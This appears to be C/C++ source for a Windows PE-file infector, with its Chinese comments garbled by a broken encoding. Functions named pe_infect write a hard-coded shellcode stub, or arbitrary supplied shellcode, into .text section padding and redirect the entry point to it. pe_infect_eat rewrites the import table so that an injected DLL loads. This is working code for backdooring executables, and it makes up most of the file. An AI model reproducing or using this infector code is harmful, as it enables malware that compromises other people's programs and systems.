#include "stdafx.h"
#include "pe.h"

//
PVOID
	ImageVaToRva(
	__in PIMAGE_NT_HEADERS NtHeaders,
	__in PVOID Base,
	__in ULONG Va
	)
{
	DWORD dwVa = Va;

	//
	PIMAGE_SECTION_HEADER SecHeader = (PIMAGE_SECTION_HEADER)((DWORD)NtHeaders + NtHeaders->FileHeader.SizeOfOptionalHeader + 0x18);

	//
	for(int i=0;i<NtHeaders->FileHeader.NumberOfSections;i++)
	{
		DWORD dwSectionVa = (DWORD)Base + SecHeader[i].PointerToRawData;
		DWORD dwSectionSize = SecHeader[i].SizeOfRawData;

		if(dwVa >= dwSectionVa && dwVa < (dwSectionSize + dwSectionVa))
		{
			dwVa = dwVa - (DWORD)Base;
			dwVa = dwVa + SecHeader[i].VirtualAddress;
			dwVa = dwVa - SecHeader[i].PointerToRawData;
			//
			return (PVOID)dwVa;
		}
		else if(dwVa < dwSectionVa)  
		{
			//�������ֵ����ǰһ���ε����ֵ������һ���ε�ַ���ڼ���ֵ
			//�������ǰһ����:
			dwVa = dwVa - (DWORD)Base;
			dwVa = dwVa + SecHeader[i-1].VirtualAddress;
			dwVa = dwVa - SecHeader[i-1].PointerToRawData;
		}
	}

	return NULL;
}

//
PVOID pe_getMapViewOfFile(LPTSTR lpFilePath)
{
	//��Ŀ���ļ�
	HANDLE hFile = CreateFile(lpFilePath,GENERIC_READ,FILE_SHARE_READ,NULL,3,0,NULL);

	//��ʧ��
	if (!hFile)
	{
		return NULL;
	}

	//�ļ�ӳ��
	HANDLE hMap = CreateFileMapping(hFile,NULL,PAGE_READONLY,0,0,NULL);

	//ӳ��ʧ��
	if (!hMap)
	{
		CloseHandle(hFile);
		return NULL;
	}

	//�ļ����ڴ��ӳ��
	PVOID lpBase = MapViewOfFile(hMap,FILE_MAP_READ,0,0,0);

	//ʧ��
	if (!lpBase)
	{
		CloseHandle(hMap);
		CloseHandle(hFile);
		return NULL;
	}

	//
	return lpBase;
}

//����Ŀ���������Ŀ��ģ��
void pe_findDllModule(LPTSTR lpFilePath,LPSTR lpDllName,ppe_retn_msg p_msg)
{
	//���ļ�
	HANDLE hFile = CreateFile(lpFilePath,
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	//���ļ�ʧ��
	if(hFile == INVALID_HANDLE_VALUE)
	{
		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't create file! error code : %d",GetLastError());
		//
		return;
	}

	//����ļ���С
	DWORD dwFileSize = GetFileSize(hFile , 0 );

	//ӳ���ļ�
	HANDLE hMap = CreateFileMapping(hFile ,
		0 ,
		PAGE_READWRITE ,
		0 ,
		dwFileSize ,
		0);

	//�ļ�ӳ���ڴ�ʧ��
	if(hMap == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't create file mapping! error code : %d",GetLastError());
		//
		return ;
	}

	//���ӳ���ַ
	LPBYTE lpBase = (LPBYTE)MapViewOfFile(hMap , FILE_MAP_READ | FILE_MAP_WRITE , 0 , 0 , dwFileSize);

	//�ļ�ӳ���ڴ�ʧ��
	if(lpBase == NULL)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't map view of file! error code : %d",GetLastError());
		//
		return ;
	}

	//���dosͷ��
	PIMAGE_DOS_HEADER pImage_dos_header=(PIMAGE_DOS_HEADER)lpBase;
	//���ntͷ��
	PIMAGE_NT_HEADERS pImage_nt_header = (PIMAGE_NT_HEADERS)((ULONG)lpBase + pImage_dos_header->e_lfanew);
	//��õ����
	PIMAGE_IMPORT_DESCRIPTOR pImage_import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)ImageRvaToVa(pImage_nt_header,lpBase,pImage_nt_header->OptionalHeader.DataDirectory[1].VirtualAddress,NULL);
	
	//���������
	while(pImage_import_descriptor->Name != NULL)
	{
		if (pImage_import_descriptor->OriginalFirstThunk == 0 && pImage_import_descriptor->FirstThunk == 0) 
		{
			break;
		}

		//����ҵ�Ŀ��ģ��Ļ�
		if(!strcmpi((LPSTR)ImageRvaToVa(pImage_nt_header,lpBase,pImage_import_descriptor->Name,NULL),lpDllName))
		{
			CloseHandle(hFile);
			CloseHandle(hMap);
			UnmapViewOfFile(lpBase);

			p_msg->isSuccessed = true;
			return;
		}

		//
		pImage_import_descriptor ++;
	}

	CloseHandle(hFile);
	CloseHandle(hMap);
	UnmapViewOfFile(lpBase);

	//������û���ҵ�
	p_msg->isSuccessed = false;
	swprintf(p_msg->tsMsg,L"no error!");
}

//���ҵ�����Ŀ¼
bool pe_findExportDir(LPTSTR lpFilePath){
	//���ļ�
	HANDLE hFile = CreateFile(lpFilePath,
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	//���ļ�ʧ��
	if(hFile == INVALID_HANDLE_VALUE)
	{
		//
		return false;
	}

	//����ļ���С
	DWORD dwFileSize = GetFileSize(hFile , 0 );

	//ӳ���ļ�
	HANDLE hMap = CreateFileMapping(hFile ,
		0 ,
		PAGE_READWRITE ,
		0 ,
		dwFileSize ,
		0);

	//�ļ�ӳ���ڴ�ʧ��
	if(hMap == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);

		//
		return false;
	}

	//���ӳ���ַ
	LPBYTE lpBase = (LPBYTE)MapViewOfFile(hMap , FILE_MAP_READ | FILE_MAP_WRITE , 0 , 0 , dwFileSize);

	//�ļ�ӳ���ڴ�ʧ��
	if(lpBase == NULL)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		//
		return false;
	}

	//���dosͷ��
	PIMAGE_DOS_HEADER pImage_dos_header=(PIMAGE_DOS_HEADER)lpBase;
	//���ntͷ��
	PIMAGE_NT_HEADERS pImage_nt_header = (PIMAGE_NT_HEADERS)((ULONG)lpBase + pImage_dos_header->e_lfanew);
	//��õ�����
	PIMAGE_EXPORT_DIRECTORY pImage_export_directory = (PIMAGE_EXPORT_DIRECTORY)ImageRvaToVa(pImage_nt_header,lpBase,pImage_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress,NULL);

	//
	if(!pImage_export_directory)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		return false;
	}

	CloseHandle(hFile);
	CloseHandle(hMap);
	UnmapViewOfFile(lpBase);

	return true;
}

//���text�ε�ƫ��
DWORD pe_getTextSecOffset(PIMAGE_SECTION_HEADER pImage_section_header , int NumberOfSections)
{
	if (NumberOfSections > 0)
	{
		//��Ϊ��һ��Section����.text
		if(!strcmpi((PCHAR)pImage_section_header->Name,".text"))
		{
			return pImage_section_header->PointerToRawData;
		}
		else
		{
			return 0;
		}
	}
	else
	{
		return 0;
	}
}

//��Ⱦ
//int bool double�Ȼ������Ϳ��Է���
//�ṹ�塢pchar�Ȳ����Է���
//���������Ұ���
void pe_infect(LPTSTR lpFilePath,LPTSTR lpDllName,LPSTR lpFuncName,ppe_retn_msg p_msg)
{
	/* shell code*/
	/*push 0 */
	/*mov eax , func_addr (address will be inserted)*/
	/*call eax */
	/*mov eax, ori oep */
	/*jmp eax */

	//shellcode
	char code[] = "\x6A\x00\xB8\x00\x00\x00\x00\xFF\xD0\xB8\x00\x00\x00\x00\xFF\xE0";   

	//���ļ�
	HANDLE hFile = CreateFile(lpFilePath,
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	//���ļ�ʧ��
	if(hFile == INVALID_HANDLE_VALUE)
	{
		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't create file! error code : %d",GetLastError());
		//
		return;
	}

	//����ļ���С
	DWORD dwFileSize = GetFileSize(hFile , 0 );

	//ӳ���ļ�
	HANDLE hMap = CreateFileMapping(hFile ,
		0 ,
		PAGE_READWRITE ,
		0 ,
		dwFileSize ,
		0);

	//�ļ�ӳ���ڴ�ʧ��
	if(hMap == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't create file mapping! error code : %d",GetLastError());
		//
		return ;
	}

	//���ӳ���ַ
	LPBYTE lpBase = (LPBYTE)MapViewOfFile(hMap , FILE_MAP_READ | FILE_MAP_WRITE , 0 , 0 , dwFileSize);

	//�ļ�ӳ���ڴ�ʧ��
	if(lpBase == NULL)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't map view of file! error code : %d",GetLastError());
		//
		return ;
	}

	//#define FIELD_OFFSET(type, field)    ((LONG)(LONG_PTR)&(((type *)0)->field))
	//#define IMAGE_FIRST_SECTION(ntheader) ((PIMAGE_SECTION_HEADER)((ULONG_PTR)ntheader + FIELD_OFFSET(IMAGE_NT_HEADERS, OptionalHeader) + ((PIMAGE_NT_HEADERS)(ntheader))->FileHeader.SizeOfOptionalHeader))

	//
	PIMAGE_DOS_HEADER pImage_dos_header = (PIMAGE_DOS_HEADER)lpBase;
	//
	PIMAGE_NT_HEADERS pImage_nt_header = (PIMAGE_NT_HEADERS)((DWORD)lpBase + pImage_dos_header->e_lfanew);
	//
	PIMAGE_SECTION_HEADER pImage_section_header= IMAGE_FIRST_SECTION(pImage_nt_header);

	//.text section PointerToRawData
	DWORD dwSectionOffset = pe_getTextSecOffset(pImage_section_header, pImage_nt_header->FileHeader.NumberOfSections);

	//
	if(dwSectionOffset == 0)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't find .text section!");
		//
		return ;
	}

	//
	DWORD dwDelta = dwSectionOffset - sizeof(code);

	//
	for(int i=0 ; i < sizeof(code) ; i++)
	{
		BYTE check = *((PBYTE)lpBase + dwDelta + i);
		//
		if(check != 0)
		{
			CloseHandle(hFile);
			CloseHandle(hMap);
			UnmapViewOfFile(lpBase);

			p_msg->isSuccessed = false;
			swprintf(p_msg->tsMsg,L"not enough space in .text section!");
			//
			return ;
		}
	}

	//���DLL�е���������ַ
	//DWORD func_addr = (DWORD)GetProcAddress(LoadLibrary("kernel32.dll") , "ExitProcess");

	//���DLL�е���������ַ
	DWORD dwFuncAddr = (DWORD)GetProcAddress(LoadLibrary(lpDllName), lpFuncName);

	//�����ú�����ַ
	if (dwFuncAddr == 0)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		USES_CONVERSION;
		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't find %ws address!",A2W(lpFuncName));
		//
		return ;
	}

	//shellcode�
	for(int i=0 ; i < sizeof(code); i++)
	{
		if(*(PBYTE)(code + i) == 0xB8)
		{
			*(PDWORD)(code + i+ 1) = dwFuncAddr;
			break;
		}
	}

	int movCount = 0;

	//shellcode�
	for(int i=0 ; i < sizeof(code); i++)
	{
		//����ԭʼOEP
		if(*(PBYTE)(code + i) == 0xB8)
		{
			movCount ++;
		}

		if (movCount == 2)
		{
			//pImage_nt_header->OptionalHeader.ImageBase װ�����ڴ�ĵ�ַ
			*(PDWORD)(code + i+ 1) = pImage_nt_header->OptionalHeader.ImageBase + pImage_nt_header->OptionalHeader.AddressOfEntryPoint;
			break;
		}
	}

	
	//д������
	memcpy(lpBase + dwDelta,code,sizeof(code));

	//new OEP
	pImage_nt_header->OptionalHeader.AddressOfEntryPoint = dwDelta;

	CloseHandle(hFile);
	CloseHandle(hMap);
	UnmapViewOfFile(lpBase);

	p_msg->isSuccessed = true;

	//
	return ;
}

//��Ⱦ2
void pe_infect(LPTSTR lpFilePath,PBYTE lpShellCode,ppe_retn_msg p_msg,int size)
{
	//���ļ�
	HANDLE hFile = CreateFile(lpFilePath,
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	//���ļ�ʧ��
	if(hFile == INVALID_HANDLE_VALUE)
	{
		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't create file! error code : %d",GetLastError());
		//
		return;
	}

	//����ļ���С
	DWORD dwFileSize = GetFileSize(hFile , 0 );

	//ӳ���ļ�
	HANDLE hMap = CreateFileMapping(hFile ,
		0 ,
		PAGE_READWRITE ,
		0 ,
		dwFileSize ,
		0);

	//�ļ�ӳ���ڴ�ʧ��
	if(hMap == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't create file mapping! error code : %d",GetLastError());
		//
		return ;
	}

	//���ӳ���ַ
	LPBYTE lpBase = (LPBYTE)MapViewOfFile(hMap , FILE_MAP_READ | FILE_MAP_WRITE , 0 , 0 , dwFileSize);

	//�ļ�ӳ���ڴ�ʧ��
	if(lpBase == NULL)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't map view of file! error code : %d",GetLastError());
		//
		return ;
	}

	//#define FIELD_OFFSET(type, field)    ((LONG)(LONG_PTR)&(((type *)0)->field))
	//#define IMAGE_FIRST_SECTION(ntheader) ((PIMAGE_SECTION_HEADER)((ULONG_PTR)ntheader + FIELD_OFFSET(IMAGE_NT_HEADERS, OptionalHeader) + ((PIMAGE_NT_HEADERS)(ntheader))->FileHeader.SizeOfOptionalHeader))

	//
	PIMAGE_DOS_HEADER pImage_dos_header = (PIMAGE_DOS_HEADER)lpBase;
	//
	PIMAGE_NT_HEADERS pImage_nt_header = (PIMAGE_NT_HEADERS)((DWORD)lpBase + pImage_dos_header->e_lfanew);
	//
	PIMAGE_SECTION_HEADER pImage_section_header= IMAGE_FIRST_SECTION(pImage_nt_header);

	//.text section PointerToRawData
	DWORD dwSectionOffset = pe_getTextSecOffset(pImage_section_header, pImage_nt_header->FileHeader.NumberOfSections);

	//
	if(dwSectionOffset == 0)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't find .text section!");
		//
		return ;
	}

	//
	DWORD dwDelta = dwSectionOffset - size;

	//
	for(int i=0 ; i < size ; i++)
	{
		BYTE check = *((PBYTE)lpBase + dwDelta + i);
		//
		if(check != 0)
		{
			CloseHandle(hFile);
			CloseHandle(hMap);
			UnmapViewOfFile(lpBase);

			p_msg->isSuccessed = false;
			swprintf(p_msg->tsMsg,L"not enough space in .text section!");
			//
			return ;
		}
	}

	//д������
	memcpy(lpBase + dwDelta,lpShellCode,size);

	//new OEP
	pImage_nt_header->OptionalHeader.AddressOfEntryPoint = dwDelta;

	CloseHandle(hFile);
	CloseHandle(hMap);
	UnmapViewOfFile(lpBase);

	p_msg->isSuccessed = true;

	//
	return ;
}

//������Ⱦ
void pe_infect_eat(LPTSTR lpFilePath,LPSTR lpDllName,LPSTR lpFuncName,ppe_retn_msg p_msg)
{
	//���ļ�
	HANDLE hFile = CreateFile(lpFilePath,
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	//���ļ�ʧ��
	if(hFile == INVALID_HANDLE_VALUE)
	{
		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't create file! error code : %d",GetLastError());
		//
		return;
	}

	//����ļ���С
	DWORD dwFileSize = GetFileSize(hFile , 0 );

	//ӳ���ļ�
	HANDLE hMap = CreateFileMapping(hFile ,
		0 ,
		PAGE_READWRITE ,
		0 ,
		dwFileSize ,
		0);

	//�ļ�ӳ���ڴ�ʧ��
	if(hMap == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't create file mapping! error code : %d",GetLastError());
		//
		return ;
	}

	//���ӳ���ַ
	PBYTE lpBase = (PBYTE)MapViewOfFile(hMap , FILE_MAP_READ | FILE_MAP_WRITE , 0 , 0 , dwFileSize);

	//�ļ�ӳ���ڴ�ʧ��
	if(lpBase == NULL)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't map view of file! error code : %d",GetLastError());
		//
		return ;
	}

	//dos
	PIMAGE_DOS_HEADER pImage_dos_header = (PIMAGE_DOS_HEADER)lpBase;

	//nt
	PIMAGE_NT_HEADERS pImage_nt_header = (PIMAGE_NT_HEADERS)((DWORD)lpBase + pImage_dos_header->e_lfanew);

	//
	PIMAGE_OPTIONAL_HEADER32 pImage_optional_header = (PIMAGE_OPTIONAL_HEADER32)(lpBase + pImage_dos_header->e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER));

	//sec
	PIMAGE_SECTION_HEADER pImage_section_header = IMAGE_FIRST_SECTION(pImage_nt_header);

	//.text section PointerToRawData
	DWORD dwSectionOffset = pe_getTextSecOffset(pImage_section_header, pImage_nt_header->FileHeader.NumberOfSections);

	//
	if(dwSectionOffset == 0)
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"can't find .text section!");
		//
		return ;
	}

	/*
	PointerToRawData Ϊ������PE�ļ��е�ƫ��
	SizeOfRawData >= VirtualSize 
	VirtualSize      �ǽ����ڴ��еĳ��� 
	SizeOfRawData    ����VirtualSize���ļ������ĳߴ硣 
	����: ���.text�Ĵ���γ���0x110�����ļ�����ߴ���0x400,��.text��SizeOfRawData   ����0x400,��virtualSize����0x110
	*/

	//import
	PIMAGE_IMPORT_DESCRIPTOR pImage_import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)ImageRvaToVa(pImage_nt_header,lpBase,pImage_nt_header->OptionalHeader.DataDirectory[1].VirtualAddress,NULL);
	
	//
	int importTableCount = 0;

	//��õ�������Ŀ
	while(pImage_import_descriptor[importTableCount].Characteristics != 0)
	{
		importTableCount ++;
	}

	//���е�������ݵĴ�С
	DWORD dwBufferSize = sizeof(IMAGE_IMPORT_DESCRIPTOR) * importTableCount;

	//��õ�һ�����va
	PBYTE pSectionEnd = lpBase + pImage_section_header->PointerToRawData + pImage_section_header->SizeOfRawData - 1;

	//���пռ��С
	UINT pPadSize = 0;

	//��ÿ��пռ��С
	while(*pSectionEnd == 0)
	{
		pPadSize ++;
		pSectionEnd --;
	}
	
	//
	PBYTE pSectionStart = pSectionEnd; 

	if (pPadSize < dwBufferSize + sizeof(IMAGE_IMPORT_DESCRIPTOR))
	{
		CloseHandle(hFile);
		CloseHandle(hMap);
		UnmapViewOfFile(lpBase);

		p_msg->isSuccessed = false;
		swprintf(p_msg->tsMsg,L"not enough space in .text section!");
		//
		return ;
	}

	//����ԭʼ�������.text���пռ�����
	memcpy(pSectionStart,pImage_import_descriptor,dwBufferSize);

	//���ԭʼ�������
	memset(pImage_import_descriptor,0,dwBufferSize);

	//����һ���µ������
	PIMAGE_IMPORT_DESCRIPTOR pImage_import_descriptor_new = PIMAGE_IMPORT_DESCRIPTOR(pSectionStart + dwBufferSize);

	//�µ�dll name
	strcpy((PCHAR)pImage_import_descriptor,lpDllName);
	PIMAGE_IMPORT_BY_NAME  pImage_import_by_name = (PIMAGE_IMPORT_BY_NAME)((PCHAR)(pImage_import_descriptor + 1)) + 5;

	//image_thunk_data
	DWORD dwThunkData = (DWORD)ImageVaToRva(pImage_nt_header,lpBase,(ULONG)pImage_import_by_name);

	memcpy((PCHAR)(pImage_import_descriptor + 1), &dwThunkData, 4);

	pImage_import_by_name->Hint = 0;
	//���ƺ�����
	strcpy((PCHAR)pImage_import_by_name->Name,lpFuncName);

	pImage_import_descriptor_new->Name = (DWORD)ImageVaToRva(pImage_nt_header,lpBase,(ULONG)pImage_import_descriptor);
	pImage_import_descriptor_new->FirstThunk = (DWORD)ImageVaToRva(pImage_nt_header,lpBase,(ULONG)(pImage_import_descriptor + 1));
	pImage_import_descriptor_new->OriginalFirstThunk = (DWORD)ImageVaToRva(pImage_nt_header,lpBase,(ULONG)(pImage_import_descriptor + 1));
	pImage_import_descriptor_new->ForwarderChain = 0;
	pImage_import_descriptor_new->TimeDateStamp = 0;

	pImage_optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = (DWORD)ImageVaToRva(pImage_nt_header,lpBase,(ULONG)(pSectionStart));
	pImage_optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size +=sizeof(IMAGE_IMPORT_DESCRIPTOR);

	CloseHandle(hFile);
	CloseHandle(hMap);
	UnmapViewOfFile(lpBase);

	p_msg->isSuccessed = true;

	//
	return ;
}

//
DWORD pe_getImportOriFuncAddressByOrdinal(PVOID lpBase,LPSTR lpDllName,DWORD dwOrdinal)
{
	//���dosͷ��
	PIMAGE_DOS_HEADER pImage_dos_header=(PIMAGE_DOS_HEADER)lpBase;
	//���ntͷ��
	PIMAGE_NT_HEADERS pImage_nt_header = (PIMAGE_NT_HEADERS)((ULONG)lpBase + pImage_dos_header->e_lfanew);
	//��õ����
	PIMAGE_IMPORT_DESCRIPTOR pImage_import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)ImageRvaToVa(pImage_nt_header,lpBase,pImage_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress,NULL);

	//���������
	while(pImage_import_descriptor->Characteristics != 0)
	{
		if (!stricmp((LPSTR)ImageRvaToVa(pImage_nt_header,lpBase,pImage_import_descriptor->Name,NULL),lpDllName))
		{
			//
			return *(PDWORD)ImageRvaToVa(pImage_nt_header,lpBase,pImage_import_descriptor->FirstThunk + dwOrdinal*4,NULL);
		}
		
		pImage_import_descriptor++;
	};
}

//
DWORD pe_getExportOriFuncAddressByOrdinal(PVOID lpBase,DWORD dwOrdinal)
{
	//
	PIMAGE_DOS_HEADER pImage_dos_header = (PIMAGE_DOS_HEADER)lpBase;

	//
	PIMAGE_NT_HEADERS pImage_nt_header = (PIMAGE_NT_HEADERS)((PBYTE)lpBase + pImage_dos_header->e_lfanew);

	//
	PIMAGE_EXPORT_DIRECTORY pImage_export_directory = (PIMAGE_EXPORT_DIRECTORY)ImageRvaToVa(pImage_nt_header,lpBase,pImage_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress,NULL);

	if (!pImage_export_directory)
	{
		return -1;
	}

	//
	DWORD dwOriFuncAddr = *(PDWORD)ImageRvaToVa(pImage_nt_header,lpBase,pImage_export_directory->AddressOfFunctions + dwOrdinal * 4,NULL);

	//
	return dwOriFuncAddr;
}